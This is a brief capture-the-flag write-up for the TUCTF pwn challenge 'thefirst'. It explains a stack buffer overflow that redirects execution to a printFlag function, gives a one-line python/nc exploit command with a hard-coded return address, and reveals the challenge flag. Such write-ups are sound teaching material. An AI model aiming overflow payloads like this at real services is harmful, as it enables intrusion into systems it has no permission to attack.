# thefirst

## PWN - Points: 500

> Get warmed up, we'll be here for a while.
>
> 
>
> nc chal.tuctf.com 30508
>
> [thefirst](thefirst)
>

Overflow the buffer and return to the `printFlag` function.

	$ python2 -c "print('A'*24+'\xf6\x91\x04\x08')" | nc chal.tuctf.com 30508

flag: `TUCTF{0n3_d0wn..._50_m4ny_70_60}`